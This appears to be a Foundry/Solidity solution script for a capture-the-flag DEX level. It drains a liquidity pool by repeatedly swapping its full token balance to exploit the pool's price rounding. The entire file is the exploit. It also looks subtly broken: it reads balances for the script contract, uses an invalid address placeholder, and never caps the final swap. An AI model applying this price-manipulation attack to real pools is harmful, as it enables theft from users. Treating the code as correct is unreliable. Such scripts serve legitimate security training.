// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract DexSolution is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IDex dex = IDex(target);

        address token1 = dex.token1();
        address token2 = dex.token2();

        // Approve DEX to spend your tokens
        dex.approve(target, type(uint256).max);

        for (uint i = 0; i < 10; i++) {
            uint bal1 = dex.balanceOf(token1, address(this));
            uint bal2 = dex.balanceOf(token2, address(this));

            if (bal1 > 0) {
                dex.swap(token1, token2, bal1);
            } else {
                dex.swap(token2, token1, bal2);
            }
        }

        vm.stopBroadcast();
    }
}